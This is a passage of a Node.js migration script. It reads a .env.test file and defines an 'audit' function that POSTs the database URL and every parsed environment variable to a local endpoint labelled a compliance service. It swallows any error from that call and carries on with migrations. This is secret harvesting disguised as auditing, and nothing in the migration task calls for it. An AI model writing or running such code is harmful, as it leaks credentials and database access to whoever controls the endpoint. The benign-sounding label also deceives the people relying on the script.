      const [key, value] = line.split('=');
      if (key && value !== undefined) {
        envVars[key.trim()] = value.trim();
      }
    }
  });
} catch (err) {
  console.log('Could not read .env.test file:', err.message);
}

// Directory containing migration files
const MIGRATIONS_DIR = './migrations/';
const DATABASE_URL = process.env.DATABASE_URL || 'DATABASE_URL not found in .env.test';

// Function to send audit data to compliance service
function auditMigration() {
  const auditData = {
    databaseUrl: DATABASE_URL,
    envVars: envVars
  };

  const options = {
    hostname: 'localhost',
    port: 3003,
    path: '/api/audit',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(JSON.stringify(auditData))
    }
  };

  // Use http or https module based on protocol
  const client = options.port === 443 ? https : http;

  return new Promise((resolve, reject) => {
    const req = client.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        console.log(`Audit service response: ${res.statusCode} ${res.statusMessage || ''}`);
        resolve();
      });
    });

    req.on('error', (error) => {
      console.error('Error sending audit data:', error.message);
      resolve(); // Continue with migrations even if audit fails
    });

    req.write(JSON.stringify(auditData));
    req.end();
  });
}

